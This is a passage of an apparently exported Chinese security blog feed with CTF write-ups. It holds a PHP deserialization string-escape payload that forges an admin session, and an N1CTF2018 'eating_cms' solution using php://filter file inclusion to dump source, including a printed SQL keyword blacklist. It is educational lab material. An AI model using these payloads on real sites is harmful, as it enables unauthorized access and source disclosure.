class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">8</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;hostname&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbuser&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbpass&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;database&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mysqli&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;N;&#125;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure><p>然后在update.php页面用post方式提交</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">age=<span class="hljs-number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:3:&#123;s:2:&quot;</span>id<span class="hljs-string">&quot;;N;s:7:&quot;</span>newinfo<span class="hljs-string">&quot;;N;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:3:&#123;s:2:&quot;</span>id<span class="hljs-string">&quot;;N;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:71:&quot;</span>select id,<span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:3:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;N;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&quot;;s:6:&quot;</span>dbuse<span class="hljs-string">r&quot;;s:4:&quot;</span>root<span class="hljs-string">&quot;;s:6:&quot;</span>dbpass<span class="hljs-string">&quot;;s:4:&quot;</span>root<span class="hljs-string">&quot;;s:8:&quot;</span>database<span class="hljs-string">&quot;;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:6:&quot;</span>mysqli<span class="hljs-string">&quot;;N;s:5:&quot;</span>token<span class="hljs-string">&quot;;N;&#125;&#125;&#125;&#125;;&#125;</span><br></code></pre></td></tr></table></figure><p>然后这个时候我们已经在session中写入了admin</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]=$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-keyword">name</span>;<br></code></pre></td></tr></table></figure><p>在login.php用admin作为用户名登录时</p><p>lib的user类</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$mysqli</span>=new dbCtrl();<br><span class="hljs-variable">$this</span>-&gt;<span class="hljs-attribute">id</span>=<span class="hljs-variable">$mysqli</span>-&gt;login(&#x27;select id,password <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where <span class="hljs-attribute">username</span>=?&#x27;);<br></code></pre></td></tr></table></figure><p>user类中的$mysqli&#x3D;new dbCtrl();会触发dbCtrl类中的__construct函数，使得<code>$this-&gt;token=$_SESSION[&#39;token&#39;];即admin</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>     <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>     <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br> &#125;<br></code></pre></td></tr></table></figure><p>这里会执行sql语句，由于数据库中存在admin用户名，所以$idResult的值为真。</p><p>然后这里由于之前在session中写入了admin，所以第一步验证就能通过，然后就会返回$idResult</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">#lib.phpdbCtrl<span class="hljs-type">::login</span>($sql)<br><br><span class="hljs-keyword">if</span> ($this-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>         <span class="hljs-keyword">return</span> $idResult;<br>     &#125;<br></code></pre></td></tr></table></figure><p>然后$this-&gt;id的值就为真，通过验证，并且自动跳转到update.php，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">id</span>)&#123;<br>       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">id</span>;<br>       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=1;<br>       <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>       <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你好！&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>       <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;<br>       <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">id</span>;<br></code></pre></td></tr></table></figure><p>最后通过update.php中的if判断得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 字符串增加逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2018-eating_cms</title>
      <link href="/2025/04/25/N1CTF2018-eating-cms/"/>
      <url>/2025/04/25/N1CTF2018-eating-cms/</url>
      
        <content type="html"><![CDATA[<h1 id="N1CTF2018-eating-cms"><a href="#N1CTF2018-eating-cms" class="headerlink" title="N1CTF2018-eating_cms"></a>N1CTF2018-eating_cms</h1><p>一进去是一个登录页面</p><p><img src="/../image/N1CTF2018-eating_cms-1.png"></p><p>盲猜有注册页面，访问&#x2F;register.php，然后随便注册一个账号，发现admin注册不了，随便换一个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>：hack<br><span class="hljs-attribute">password</span>：<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>登录成功后自动跳转到一个网页</p><p><img src="/../image/N1CTF2018-eating_cms-2.png"></p><p>发现此时的url有点奇怪</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://a114f556-b6b8-<span class="hljs-number">4149</span>-af74-<span class="hljs-number">4</span>b56d7c40da9.node5.buuoj.cn:<span class="hljs-number">81</span>/user.php?page=guest<br></code></pre></td></tr></table></figure><p>猜测有这里存在文件包含漏洞，测试一下之后发现存在，使用伪协议读取源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/user.php?page=php://filter/convert.base64-encode/resource=index<br></code></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br> <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-comment">//需要page为空</span><br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;function.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=info&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/index.html&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<span class="hljs-comment">//把url分段解析，是数组的类型</span><br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<span class="hljs-comment">//不能存在特殊字符</span><br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)//也就是一个过滤类</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<span class="hljs-comment">//对用户名进行了过滤</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<span class="hljs-comment">//密码进行了加密</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span 